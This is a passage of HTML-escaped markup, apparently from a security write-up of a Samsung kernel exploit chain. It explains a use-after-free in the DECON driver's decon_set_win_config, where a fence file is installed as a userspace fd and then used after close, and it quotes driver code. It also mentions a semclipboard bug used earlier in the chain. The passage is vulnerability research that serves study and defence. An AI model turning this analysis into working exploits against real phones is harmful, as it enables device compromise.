class=\"vdnyYxSRCi-c2\"&gt;/proc/&amp;lt;PID&amp;gt;/fd/&amp;lt;fd&amp;gt;&lt;/span&gt;&lt;span&gt;. The &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;semclipboard&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;vulnerability (vulnerability #1) is then used to get the raw file descriptor for the DECON driver path. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;h2 class=\"vdnyYxSRCi-c17 vdnyYxSRCi-c8\" id=\"h.tv7cyox27woi\"&gt;&lt;span class=\"vdnyYxSRCi-c16\"&gt;Triggering the Use-After-Free&lt;/span&gt;&lt;/h2&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The vulnerability is in the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;decon_set_win_config&lt;/span&gt;&lt;span&gt;&amp;nbsp;function in the Samsung DECON driver. The vulnerability is a &lt;/span&gt;&lt;span&gt;relatively common use-after-free pattern in kernel drivers. First, the driver acquires an fd for a &lt;/span&gt;&lt;span&gt;fence&lt;/span&gt;&lt;span&gt;. This fd is associated with a file pointer in a &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;sync_file&lt;/span&gt;&lt;span&gt;&amp;nbsp;struct, specifically the &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;file&lt;/span&gt;&lt;span&gt;&amp;nbsp;member. A &amp;ldquo;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c24\"&gt;&lt;a class=\"vdnyYxSRCi-c61\" href=\"https://www.kernel.org/doc/html/latest/driver-api/sync_file.html\"&gt;fence&lt;/a&gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;rdquo; is used for sharing buffers and synchronizing access between drivers and different processes. &lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.79013f3cd36b222e13f8754dff072e9c46a78a1d\"&gt;&lt;/a&gt;&lt;a id=\"t.16\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;/**&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;* struct sync_file - sync file to export to the userspace&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;* @file: &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; file representing this fence&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;* @sync_file_list: &amp;nbsp; &amp;nbsp; membership in global file list&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;* @wq: &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; wait queue for fence signaling&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;* @fence: &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;fence with the fences in the sync_file&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;* @cb: &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; fence callback information&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;sync_file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5 vdnyYxSRCi-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;file &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;/**&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* @user_name:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Name of the sync file provided by userspace, for merged fences.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* Otherwise generated through driver callbacks (in which case the&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;* entire array is 0).&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;*/&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;char&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;user_name&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;[&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;32&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;#ifdef&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&amp;nbsp;CONFIG_DEBUG_FS&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;list_head &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;sync_file_list&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;#endif&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; wait_queue_head_t &amp;nbsp; &amp;nbsp; &amp;nbsp; wq&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;unsigned&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;long&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; flags&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;dma_fence &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;dma_fence_cb cb&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8\"&gt;&lt;span&gt;The driver then calls &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;fd_install&lt;/span&gt;&lt;span&gt;&amp;nbsp;on the &lt;/span&gt;&lt;span&gt;fd and file pointer, which makes the fd&lt;/span&gt;&lt;span&gt;&amp;nbsp;accessible from userspace and transfers ownership of the reference to the fd table. Userspace is able to call &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c2\"&gt;close&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&amp;nbsp;on that fd. If that fd holds the only reference to the file struct, then the file struct is freed. However, the driver continues to use the pointer to that freed file struct.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c8 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c7\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;a id=\"t.3acf649b0273fce30d25bdc90665e3e537859c59\"&gt;&lt;/a&gt;&lt;a id=\"t.17\"&gt;&lt;/a&gt;&lt;table class=\"vdnyYxSRCi-c23\"&gt;&lt;tr class=\"vdnyYxSRCi-c19\"&gt;&lt;td class=\"vdnyYxSRCi-c10\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;static&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;decon_set_win_config&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;decon_device &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;decon_win_config_data &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;win_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;num_of_window &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;decon_reg_data &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;regs&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;struct&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;sync_file &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;*&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;sync_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;int&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;i&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;j&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;ret &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;[...]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; num_of_window &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;decon_get_active_win_count&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;win_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;num_of_window&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;win_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;retire_fence &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;=&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;decon_create_fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;sync_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;win_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;retire_fence &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c13\"&gt;0&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;goto&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;err_prepare&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;}&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;else&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;[...]&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1 vdnyYxSRCi-c14\"&gt;&lt;span class=\"vdnyYxSRCi-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c5\"&gt;if&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;num_of_window&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;fd_install&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;win_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;retire_fence&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;sync_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;decon_create_release_fences&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;(&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;decon&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;win_data&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;,&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c4 vdnyYxSRCi-c9\"&gt;&amp;nbsp;sync_file&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0 vdnyYxSRCi-c9\"&gt;)&lt;/span&gt;&lt;span class=\"vdnyYxSRCi-c0\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"vdnyYxSRCi-c1\"&gt;&lt;span class=\"vdnyYxSRCi-c20\"&gt;#if !defined(CONFIG_SUPPORT_LEGACY_FENCE)&lt;/span&gt;&lt;/p&gt;\n &lt;p 